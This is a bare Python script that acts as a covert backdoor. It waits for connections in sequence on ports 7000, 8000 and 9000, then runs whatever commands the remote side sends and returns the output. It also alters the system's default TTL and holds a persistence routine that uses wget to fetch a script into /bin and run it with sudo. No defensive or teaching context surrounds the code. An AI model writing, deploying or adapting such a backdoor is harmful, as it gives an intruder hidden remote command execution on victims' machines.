import socket
import time
import os
import sys
import re
import subprocess
import threading

def bind_seven():
    while True:
        try:
            time.sleep(2)
            sev = socket.socket()
            sev.bind(('0.0.0.0', 7000))
            sev.settimeout(5)
            sev.listen(1)
            con, addr = sev.accept()
            if con is not None:
                sev.close()
                bind_eight(addr[0])
        except KeyboardInterrupt:
            quit(1)
        except socket.timeout:
            pass
        except socket.error:
            pass


def bind_eight(addr):
    try:
        eight = socket.socket()
        eight.bind(('0.0.0.0', 8000))
        eight.settimeout(5)
        eight.listen(1)
        conn, addr = eight.accept()
        if conn is not None:
            eight.close()
            bind_nine(addr[0])

    except socket.timeout:
        bind_seven()

def bind_nine(addr):
    try:
        nine = socket.socket()
        nine.bind(('0.0.0.0', 9000))
        nine.settimeout(5)
        nine.listen(1)
        conn, addr= nine.accept()
        if conn is not None:
            exploit(conn)
    except socket.timeout:
        bind_seven()

def exploit(conn):
    ttl()
    while True:
        cmd = conn.recv(1024)
        l = re.sub('^\w', '', cmd).split()
        try:
            a = subprocess.check_output(l)
        except subprocess.CalledProcessError:
            pass
        conn.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        conn.send(a)

def persist():
    os.system('wget 127.0.0.1:5000/static/persist.py -o /bin/persist.py')
    os.system('sudo python /bin/persist.py')

def ttl():
    os.system('echo 3 > /proc/sys/net/ipv4/ip_default_ttl')

bind_seven()


